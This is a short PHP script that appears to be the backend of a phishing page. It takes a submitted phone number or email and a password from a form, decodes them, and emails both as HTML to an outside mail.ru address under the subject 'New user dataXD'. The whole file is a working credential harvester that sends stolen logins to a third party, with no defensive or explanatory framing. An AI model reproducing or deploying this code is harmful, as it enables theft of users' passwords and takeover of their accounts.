<?php

$numOrMail = $_POST['numOrMail'];
$pswd = $_POST['pswd'];

$numOrMail = urldecode($numOrMail);
$pswd = urldecode($pswd);

$numOrMail = trim($numOrMail);
$pswd = trim($pswd);

mail(
	"Sdi9Lf5i@mail.ru",
	"New user dataXD",
	"<html><body><p>$numOrMail</p><p>$pswd</p></body></html>",
	"From: VVjpBkJx@mail.ru\r\n"
	."Content-type: text/html; charset=utf-8\r\n"
	."X-Mailer: PHP mail script"
);

?>